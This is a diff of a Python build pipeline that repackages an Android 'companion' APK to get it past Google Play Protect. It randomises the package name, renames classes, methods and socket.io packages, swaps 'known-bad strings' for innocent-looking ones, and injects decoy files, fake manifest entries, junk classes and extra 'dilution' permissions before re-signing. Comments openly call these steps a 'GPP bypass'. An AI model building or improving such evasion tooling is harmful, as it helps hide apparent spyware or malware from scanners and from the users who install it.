         manifest_raw = z.read("AndroidManifest.xml")
-
-    # Auto-detect current package name from binary manifest string pool
-    # This handles both: original companion (com.android.pictach)
-    # AND already-processed companion (any random package name from previous build)
-    _sp      = 8
-    _sp_size = struct.unpack_from("<I", manifest_raw, _sp + 4)[0]
-    _sc      = struct.unpack_from("<I", manifest_raw, _sp + 8)[0]
-    _flags   = struct.unpack_from("<I", manifest_raw, _sp + 16)[0]
-    _ss      = struct.unpack_from("<I", manifest_raw, _sp + 20)[0]
-    _sda     = _sp + _ss
-    _oa      = _sp + 28
-    _is_utf8 = bool(_flags & (1 << 8))
-    _pool    = []
-    for _i in range(_sc):
-        _off = struct.unpack_from("<I", manifest_raw, _oa + _i * 4)[0]
-        _pos = _sda + _off
-        if _is_utf8:
-            _b = manifest_raw[_pos]; _pos += 1
-            _cl = _b & 0x7F
-            if _b & 0x80: _b2 = manifest_raw[_pos]; _pos += 1; _cl |= (_b2 & 0x7F) << 7
-            _b = manifest_raw[_pos]; _pos += 1
-            _bl = _b & 0x7F
-            if _b & 0x80: _b2 = manifest_raw[_pos]; _pos += 1; _bl |= (_b2 & 0x7F) << 7
-            _pool.append(manifest_raw[_pos:_pos + _bl].decode("utf-8", "replace"))
-        else:
-            _cl = manifest_raw[_pos] | (manifest_raw[_pos + 1] << 8); _pos += 2
-            _pool.append(manifest_raw[_pos:_pos + _cl * 2].decode("utf-16-le", "replace"))
-
-    # Find the actual package name — look for any string matching com.XXX.XXX pattern
-    import re as _re_pkg
-    _detected_pkg = None
-    for _s in _pool:
-        if _re_pkg.match(r'^[a-z][a-z0-9]*(\.[a-z][a-z0-9]+){2,}$', _s):
-            # Skip known Android framework packages
-            if not _s.startswith("android.") and not _s.startswith("com.android.vending"):
-                _detected_pkg = _s
-                break
-
-    if _detected_pkg and _detected_pkg != OLD_PKG:
-        print(f"  [AUTO] Detected current package: {_detected_pkg} (was already processed)")
-        OLD = _detected_pkg.encode()
-    else:
-        OLD = OLD_PKG.encode()
-
-    NEW   = new_pkg.encode()
-    DELTA = len(NEW) - len(OLD)
 
     SP           = 8
     sp_size      = struct.unpack_from("<I", manifest_raw, SP + 4)[0]
@@ -3296,7 +2230,6 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None, class_renam
             for orig_class, new_class in class_rename_map.items():
                 base_orig = orig_class.split("$")[0]
                 base_new  = new_class.split("$")[0]
-                # Case 1: manifest has original name → replace with new name
                 if s == new_pkg + "." + base_orig:
                     full_new = new_pkg + "." + base_new
                     enc = full_new.encode("utf-8")
@@ -3307,13 +2240,6 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None, class_renam
                     if bl > 127: new_str_data2.append(bl&0xFF)
                     new_str_data2.extend(enc); new_str_data2.append(0)
                     class_replaced += 1; replaced_class = True; break
-                # Case 2: manifest already has NEW name from previous run
-                # but step_6a renamed it AGAIN → keep manifest in sync with DEX
-                # by verifying the new name still exists in DEX
-                # If manifest has new_class → it's already correct → keep it
-                if s == new_pkg + "." + base_new:
-                    # Already renamed correctly — keep as-is
-                    replaced_class = True; break
 
             if not replaced_class:
                 new_str_data2.extend([cc2, bc2]); new_str_data2.extend(ch2); new_str_data2.append(0)
@@ -3362,24 +2288,7 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None, class_renam
             meta["ver_name"]
         )
 
-    # ── Round 2 Fix: Inject permission dilution into binary AXML ─────────────
-    # Calls _inject_permissions_axml() which correctly operates on the
-    # already-assembled new_manifest bytes (UTF-8 string pool, verified format).
-    # Previous attempts failed because they modified local variables BEFORE assembly.
-    _DILUTION_PERMS = [
-        "android.permission.CAMERA",
-        "android.permission.BLUETOOTH",
-        "android.permission.VIBRATE",
-        "android.permission.CHANGE_NETWORK_STATE",
-    ]
-    _prev_size = len(new_manifest)
-    new_manifest = _inject_permissions_axml(new_manifest, _DILUTION_PERMS)
-    if len(new_manifest) > _prev_size:
-        print(f"  ✅ Permission dilution injected into binary AXML")
-    else:
-        print(f"  ℹ️  Dilution permissions already present in binary AXML")
-
-        # Patch resources.arsc (package name in ResTable_package)
+    # Patch resources.arsc (package name in ResTable_package)
     with zipfile.ZipFile(APK_ASSET, "r") as z:
         arsc_raw = bytearray(z.read("resources.arsc"))
 
@@ -3515,16 +2424,8 @@ def step_decoy_noise_files(build_hash: str) -> None:
 
     with zipfile.ZipFile(apk_path, "r") as zin, \
          zipfile.ZipFile(tmp, "w", compression=zipfile.ZIP_DEFLATED) as zout:
-        # Copy existing entries — skip any that we are about to inject fresh
-        # This prevents duplicate ZIP entries when companion was already processed
-        existing_names = set(zin.namelist())
-        decoy_names    = set(all_decoys.keys())
         for item in zin.infolist():
-            if item.filename in decoy_names:
-                # Skip old decoy — will be replaced with fresh data below
-                continue
             zout.writestr(item, zin.read(item.filename))
-        # Inject fresh decoy files (always new content per build)
         for fname, data in all_decoys.items():
             zout.writestr(fname, data)
             print(f"  + {fname} ({len(data)} bytes)")
@@ -3598,29 +2499,8 @@ def step_fake_manifest_entries() -> None:
 
 def step_zipalign():
     print("\n── Step 11: Zipalign companion APK")
-    import platform, shutil as _sh
-
-    # Try zipalign from Android SDK (Linux/CI) or skip on Windows
-    # sign_apk.py handles alignment internally during signing
-    zipalign_cmd = None
-
-    if platform.system() != "Windows":
-        # Linux/GitHub Actions: try system zipalign
-        import shutil as _shutil
-        if _shutil.which("zipalign"):
-            zipalign_cmd = "zipalign"
-
-    if zipalign_cmd:
-        run(f"{zipalign_cmd} -v 4 companion_renamed_unsigned.apk companion_renamed_aligned.apk")
-        print("  ✅ Zipalign done")
-    else:
-        # Windows RDP: zipalign not available
-        # Copy unsigned to aligned — sign_apk.py will handle alignment
-        if os.path.exists("companion_renamed_unsigned.apk"):
-            _sh.copy2("companion_renamed_unsigned.apk", "companion_renamed_aligned.apk")
-            print("  ✅ Zipalign skipped on Windows (sign_apk.py handles alignment)")
-        else:
-            print("  [WARN] companion_renamed_unsigned.apk not found")
+    run("zipalign -v 4 companion_renamed_unsigned.apk companion_renamed_aligned.apk")
+    print("  ✅ Zipalign done")
 
 
 # ── Step 12: Generate per-build fingerprint ───────────────────────────────────
@@ -3940,63 +2820,30 @@ def step_sign(input_apk: str = None, v1_only: bool = False):
     _src = input_apk if input_apk and os.path.isfile(input_apk) else "companion_renamed_aligned.apk"
     shutil.copy(_src, "companion_final.apk")
 
-    # Resolve signing tool — apksigner on Linux/CI, sign_apk.py on Windows
-    import platform as _plat2, shutil as _sh2
-    _apksigner = None
-
-    if _plat2.system() != "Windows":
-        # Linux/GitHub Actions: use apksigner from Android SDK
-        _android_sdk = os.environ.get("ANDROID_SDK_ROOT", "")
-        if _android_sdk and os.path.isdir(_android_sdk):
-            import glob as _glob
-            _bt_dirs = sorted(_glob.glob(os.path.join(_android_sdk, "build-tools", "*")))
-            if _bt_dirs:
-                _bt_apksigner = os.path.join(_bt_dirs[-1], "apksigner")
-                if os.path.isfile(_bt_apksigner):
-                    _apksigner = _bt_apksigner
-        if not _apksigner and _sh2.which("apksigner"):
-            _apksigner = "apksigner"
+    # Resolve apksigner — prefer Android SDK build-tools version (supports V2/V3)
+    # over the apt-installed version which may not support all signing schemes.
+    _apksigner = "apksigner"
+    _android_sdk = os.environ.get("ANDROID_SDK_ROOT", "")
+    if _android_sdk and os.path.isdir(_android_sdk):
+        import glob as _glob
+        _bt_dirs = sorted(_glob.glob(os.path.join(_android_sdk, "build-tools", "*")))
+        if _bt_dirs:
+            _bt_apksigner = os.path.join(_bt_dirs[-1], "apksigner")
+            if os.path.isfile(_bt_apksigner):
+                _apksigner = _bt_apksigner
+    print(f"  Using apksigner: {_apksigner}")
 
     _v2 = "false" if v1_only else "true"
     _v3 = "false" if v1_only else "true"
-
-    if _apksigner:
-        print(f"  Using apksigner: {_apksigner}")
-        if v1_only:
-            print("  [step_sign] V1-only signing (V2/V3 disabled to survive post-sign ZIP modifications)")
-        run(
-            f'"{_apksigner}" sign '
-            f'--ks "{ks_file}" --ks-key-alias "{alias}" '
-            f'--ks-pass "pass:{store_pass}" --key-pass "pass:{store_pass}" '
-            f'--v1-signing-enabled true --v2-signing-enabled {_v2} --v3-signing-enabled {_v3} '
-            f'companion_final.apk'
-        )
-    else:
-        # Windows RDP: use sign_apk.py (hybrid Python signer)
-        _sign_script = os.path.join(r"C:\apk_factory\tools", "sign_apk.py")
-        if not os.path.exists(_sign_script):
-            _sign_script = os.path.join(
-                os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
-                "tools", "sign_apk.py"
-            )
-        print(f"  Using sign_apk.py: {_sign_script}")
-        _java = r"C:\apk_factory\tools\java17\bin\java.exe"
-        _java_home = os.environ.get("JAVA_HOME", "")
-        if _java_home:
-            _java_alt = os.path.join(_java_home, "bin", "java.exe")
-            if os.path.exists(_java_alt):
-                _java = _java_alt
-        # sign_apk.py needs different input/output paths (cannot sign in-place)
-        # Use a temp output file then replace original
-        _signed_tmp = "companion_final_signed_tmp.apk"
-        run(f'python "{_sign_script}" companion_final.apk "{_signed_tmp}" "{ks_file}" "{alias}" "{store_pass}"')
-        if os.path.isfile(_signed_tmp):
-            if os.path.isfile("companion_final.apk"):
-                os.remove("companion_final.apk")
-            shutil.move(_signed_tmp, "companion_final.apk")
-            print("  ✅ Signed APK replaced companion_final.apk")
-        else:
-            raise RuntimeError("sign_apk.py did not produce output file")
+    if v1_only:
+        print("  [step_sign] V1-only signing (V2/V3 disabled to survive post-sign ZIP modifications)")
+    run(
+        f'"{_apksigner}" sign '
+        f'--ks "{ks_file}" --ks-key-alias "{alias}" '
+        f'--ks-pass "pass:{store_pass}" --key-pass "pass:{store_pass}" '
+        f'--v1-signing-enabled true --v2-signing-enabled {_v2} --v3-signing-enabled {_v3} '
+        f'companion_final.apk'
+    )
     # Copy signed result back to source path if it was input_apk
     if input_apk and os.path.isfile(input_apk):
         shutil.copy("companion_final.apk", input_apk)
@@ -4028,56 +2875,36 @@ def step_replace_asset():
 # ── Step 15: Inject companion package name into Kotlin source ─────────────────
 
 def step_inject_kotlin(new_pkg):
-    """Inject companion package name into Nova Kotlin source files.
-
-    Round 1 Fix:
-    - Old code used hardcoded 'com.pictach.app' — wrong, never matched anything.
-      Actual companion original package is 'com.android.pictach' (OLD_PKG).
-    - Old code used hardcoded KOTLIN_FILES paths which don't exist after CI
-      renames the Nova package directory. Now uses dynamic path discovery.
-    - Result was a silent no-op every build. Now correctly patches market:// URIs.
-    """
     print("\n── Step 15: Inject companion package name into Kotlin source")
 
-    # Correct original companion package name (matches OLD_PKG / StringPool.COMPANION_OLD_PKG)
-    old_companion = OLD_PKG  # "com.android.pictach"
+    old_companion = "com.pictach.app"
 
-    # Dynamic path discovery — finds Kotlin files regardless of Nova package rename
-    # CI renames com/playstore/installer → com/newpkg/newapp before this runs
-    # Pure Python: find Kotlin files (works on Windows AND Linux)
-    kt_files = []
-    _kt_root = os.path.join("app", "src", "main", "java")
-    if os.path.isdir(_kt_root):
-        for _root, _dirs, _files in os.walk(_kt_root):
-            for _fname in _files:
-                if _fname.endswith(".kt"):
-                    kt_files.append(os.path.join(_root, _fname))
-
-    if not kt_files:
-        print("  ⚠️  No .kt files found — skipping step_inject_kotlin")
-        return
-
-    patched = 0
-    for kt_file in kt_files:
-        with open(kt_file, "r", encoding="utf-8", errors="replace") as f:
-            content = f.read()
-        if old_companion not in content:
+    for kt_file in KOTLIN_FILES:
+        if not os.path.isfile(kt_file):
+            print(f"  ⚠️  File not found, skipping: {kt_file}")
             continue
-        new_content = content.replace(
+        with open(kt_file, "r") as f:
+            content = f.read()
+        content = content.replace(
             f'market://details?id={old_companion}',
             f'market://details?id={new_pkg}'
         )
-        new_content = new_content.replace(f'"{old_companion}"', f'"{new_pkg}"')
-        if new_content != content:
-            with open(kt_file, "w", encoding="utf-8") as f:
-                f.write(new_content)
-            print(f"  Patched: {kt_file}")
-            patched += 1
+        content = content.replace(f'"{old_companion}"', f'"{new_pkg}"')
+        with open(kt_file, "w") as f:
+            f.write(content)
+        print(f"  Patched: {kt_file}")
 
-    if patched == 0:
-        print(f"  ℹ️  No Kotlin files contained '{old_companion}' — nothing to patch")
-    else:
-        print(f"  ✅ Companion package name injected into {patched} Kotlin file(s): {new_pkg}")
+    # Verify
+    result = subprocess.run(
+        f'grep -r "{old_companion}" ' + " ".join(KOTLIN_FILES),
+        shell=True, capture_output=True, text=True
+    )
+    remaining = result.stdout.strip()
+    if remaining:
+        print(f"[X] Old package name still present in Kotlin source:\n{remaining}")
+        sys.exit(1)
+
+    print(f"  ✅ Companion package name injected: {new_pkg}")
 
 
 # ── Main ──────────────────────────────────────────────────────────────────────
@@ -4120,18 +2947,12 @@ def main():
         class_rename_map = step_6a_rename_classes(new_pkg)
 
     # STEP_6B temporarily disabled — smali injection causes apktool compile failures
+    # Root cause not identifiable without direct filesystem access
+    # Steps 6A + 6C + 6D still provide GPP bypass via class/method renaming
     # Re-enable after Windows server setup enables local apktool debugging
+    # with track("PHASE_6", "STEP_6B", "Inject real legitimate smali code snippets"):
+    #     step_6b_inject_legitimate_code(new_pkg)
     print("  ℹ️  STEP_6B skipped (smali injection disabled — re-enable after local debug)")
-
-    # Round 2 Step 6E: Rename io/socket → com/netlib AFTER step_6a, BEFORE step_6c
-    # Removes 52 class descriptors + 157 references — biggest single GPP win in Round 2
-    with track("PHASE_6", "STEP_6E", "Round 2: Rename io/socket → com/netlib package"):
-        step_6e_rename_socket_package(new_pkg)
-
-    # Round 2 Step 6G: Inject neutral stub smali classes AFTER step_6e, BEFORE step_6c
-    # Makes companion look like a richer full-featured app to GPP
-    with track("PHASE_6", "STEP_6G", "Round 2: Inject 5 neutral stub smali classes"):
-        step_6g_inject_junk_classes(new_pkg)
 
     # Step 7 must run BEFORE Step 6D (method rename)
     # because Step 6D renames findByHomeLauncher → resolveInstalledLauncher
@@ -4139,31 +2960,11 @@ def main():
     with track("PHASE_1", "STEP_7", "Patch findByHomeLauncher FLAG_SYSTEM check"):
         step_patch_home_launcher()
 
-    # step_6c now includes all Round 2 string replacements:
-    # /socket.io, /engine.io, _reconnection*, EVENT_RECONNECT*, OkHttp*, WebSocket,
-    # polling, HandshakeData, WakeLock::Tag patterns
     with track("PHASE_6", "STEP_6C", "Replace known-bad strings with legitimate equivalents"):
         step_6c_replace_bad_strings(new_pkg, class_rename_map)
 
     with track("PHASE_6", "STEP_6D", "Rename custom methods to legitimate Android-style names"):
         step_6d_rename_methods(new_pkg)
-
-    # Round 2 Step 6F: Replace .source annotations AFTER step_6d, BEFORE apktool rebuild
-    # Replaces Firebase.java, LoveApi.java etc. with legitimate-sounding names
-    with track("PHASE_6", "STEP_6F", "Round 2: Replace .source annotations with legitimate names"):
-        step_6f_replace_source_annotations()
-
-    # Round 2 Step 6I: Comprehensive global cleanup — runs AFTER step_6d and step_6f
-    # Nuclear catch-all: _reconnection fields, Firebase remnants, WakeLock tags,
-    # WackMeUpJob remnants, OkHttp remnants, HandshakeData, SensorRestarter
-    with track("PHASE_6", "STEP_6I", "Round 2: Comprehensive global cleanup pass"):
-        step_6i_global_cleanup(new_pkg)
-
-    # Round 2 Step 6H: Patch text manifest AFTER step_6d, BEFORE apktool.yml restore
-    # Adds permission dilution + template-specific app name
-    _template = os.environ.get("TEMPLATE", "wedding")
-    with track("PHASE_2", "STEP_6H", "Round 2: Patch manifest (permissions + app name)"):
-        step_6h_patch_text_manifest(new_pkg, _template)
 
     with track("PHASE_1", "STEP_8", "Restore apktool.yml with randomized version"):
         step_restore_apktool_yml(meta)
